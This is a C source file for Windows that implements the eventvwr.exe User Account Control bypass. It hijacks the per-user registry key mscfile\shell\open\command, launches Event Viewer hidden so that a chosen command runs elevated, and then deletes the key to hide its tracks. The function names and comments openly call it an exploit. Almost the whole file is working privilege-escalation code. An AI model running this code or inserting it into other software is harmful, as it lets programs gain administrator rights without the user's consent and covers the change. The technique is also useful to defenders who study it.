#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * Pretty standard code to recursively nuke a Reg Key
 */

int RegDelnodeRecurse (LPTSTR lpSubKey) {
    LPTSTR lpEnd;
    LONG lResult;
    DWORD dwSize = MAX_PATH;
    TCHAR szName[MAX_PATH];
    HKEY hKey;
    FILETIME ftWrite;

    lResult = RegDeleteKey(HKEY_CURRENT_USER, lpSubKey);

    if (lResult == ERROR_SUCCESS) return 1;

    lResult = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ, &hKey);

    if (lResult != ERROR_SUCCESS) return lResult == ERROR_FILE_NOT_FOUND;

    lpEnd    = lpSubKey + lstrlen(lpSubKey);
    *lpEnd++ = '\\';
    *lpEnd   = '\0';

    if (RegEnumKeyEx(hKey, 0, szName, &dwSize, 0, 0, 0, &ftWrite) == ERROR_SUCCESS) {
        do {
            strcpy(lpEnd, szName);
            if (!RegDelnodeRecurse(lpSubKey)) break;
            lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, 0, 0, 0, &ftWrite);
        } while (lResult == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = TEXT('\0');

    RegCloseKey(hKey);

	return RegDeleteKey(HKEY_CURRENT_USER, lpSubKey) == ERROR_SUCCESS;
}

/*
 * Wrapper for above
 */

int RegDelnode() {
    TCHAR szDelKey[MAX_PATH*2] = "Software\\Classes\\mscfile";
    return RegDelnodeRecurse(szDelKey);
}

void __c_exploitUAC() {
	char curPath[MAX_PATH], evtVwr[MAX_PATH];
	HKEY attackKey;
	SHELLEXECUTEINFO exInfo;

	/*
	curPath is the command you want to elevate.
	Below is an example that shows how to elevate
	foobar.exe sitting in the same path as this
	program.
	*/

	/*
	GetCurrentDirectory(MAX_PATH, curPath);
	strcat(curPath, "\\foobar.exe");
	*/

	sprintf(evtVwr, "%s\\System32\\eventvwr.exe", getenv("SYSTEMROOT"));

	if(!RegDelnode()) return;
	if(RegCreateKey(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command", &attackKey)!=ERROR_SUCCESS) return;

	RegSetValueEx(attackKey, "", 0, REG_SZ, curPath, strlen(curPath));

	exInfo.lpVerb       = "open";
	exInfo.lpFile       = evtVwr;
	exInfo.nShow        = 0;
	exInfo.fMask        = SEE_MASK_NOCLOSEPROCESS;
	exInfo.cbSize       = sizeof(SHELLEXECUTEINFO);
	exInfo.hwnd         = 0;
	exInfo.lpParameters = 0;
	exInfo.lpDirectory  = 0;
	exInfo.hInstApp     = 0;

	ShellExecuteEx(&exInfo);

	Sleep(5000);

	TerminateProcess(exInfo.hProcess, 0);

	RegCloseKey(attackKey);
	RegDelnode();
}

int main(int argc, char *argv[]) {
	__c_exploitUAC();
	return 0;
}
